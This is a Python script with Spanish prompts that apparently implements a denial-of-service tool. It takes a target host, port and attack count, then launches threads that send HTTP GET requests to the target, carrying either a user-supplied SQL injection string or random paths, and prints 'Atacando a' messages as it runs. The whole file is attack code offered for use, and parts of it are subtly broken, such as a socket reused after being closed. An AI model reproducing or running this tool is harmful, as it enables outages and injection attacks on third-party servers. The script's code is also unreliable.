import socket
import sys
import threading
import string
import time
import random
from tabulate import tabulate
from colorama import Fore
def dos():
    try:
        tabla = [['-s','Agregar parametro SQLi'], ['-n','Agregar cantidad de veces sin parametro SQLi']]
        print("Ingresa alguna de estas opciones en 'Parametro'.")
        print(tabulate(tabla, tablefmt="fancy_grid"))
        host = input("Host: ")
        puerto = int(input("Puerto: "))
        parametro = input("Parametro: ")

        if host.startswith("https://"):
            host = host.replace("https://","")
            if host.endswith("/"):
                host = host.replace("/","")
        if host.startswith("http://"):
            host = host.replace("http://", "")
            if host.endswith("/"):
                host = host.replace("/","")
        
        ip = str(socket.gethostbyname(host))

        if parametro == "-s":
            sqli = input("Parametro SQli [index.php?id=1 AND SELECT....]: ")
            rango1 = int(input("Numero de ataques: "))
            for i in range(rango1):
                time.sleep(0.01)
                thread = threading.Thread(target=dos1, args=(ip, host, puerto, sqli, parametro))
                thread.start()

        elif parametro == "-n":
            rango1 = int(input("Numero de ataques: "))
            sqli = ""
            for i in range(rango1):
                time.sleep(0.01)
                thread = threading.Thread(target=dos1, args=(ip, host, puerto, sqli, parametro))
                thread.start()
        else:
            print("Ingresa un valor valido.")
            exit()

    except socket.gaierror:
        print(f"no se pudo reconocer el host '{host}'")
    except KeyboardInterrupt:
        print(str(Fore.RESET) + "El conocimiento es libre")

   
  
def generar_url_direccion():
    msg = str(string.digits + string.hexdigits+ string.octdigits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data
    
def dos1(ip, host, puerto, sqli, rango):
    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    texto = f" Atacando a {ip} en el puerto {puerto}"
    colores = str(Fore.RED) + texto, str(Fore.YELLOW) + texto, str(Fore.CYAN) + texto
    dato = "".join(random.sample(colores, 1))

    if rango == "-s":
        try:
            while True:
                servidor.connect((ip, puerto))
                dos = "GET /%s HTTP/1.1\nHost: %s\n\n" % (sqli, host)
                dos1 = dos.encode()
                servidor.send(dos1)
                servidor.close()

                print(dato)
                print(str(Fore.RESET))
        except socket.error:
            print("")
        except KeyboardInterrupt:
            print(Fore.RESET + "El conocimiento es libre")

    elif rango == "-n":
        try:
            while True:
                servidor.connect((ip, puerto))
                data = generar_url_direccion()
                dos = "GET /%s HTTP/1.1\nHost: %s\n\n" % (data, host)
                dos1 = dos.encode()
                servidor.send(dos1)
                servidor.close()

                print(dato)
                print(str(Fore.RESET))
        except socket.error:
            print("")
        except KeyboardInterrupt:
            print(Fore.RESET + "El conocimiento es libre")

    

if __name__ == "__main__":
    print("¿Què intentas hacer?")
else:
    dos()
